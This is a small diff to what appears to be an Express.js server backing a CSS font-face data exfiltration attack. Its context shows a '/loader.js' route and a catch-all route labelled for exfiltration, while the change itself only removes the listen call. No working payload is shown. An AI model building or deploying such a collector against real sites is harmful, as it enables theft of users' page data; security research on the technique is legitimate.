@@ -33,9 +33,6 @@ app.get('/loader.js', (req, res) => {
   });
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
 
 // Catch-all route for data exfiltration (font-face trick)
 app.get('*', (req, res) => {
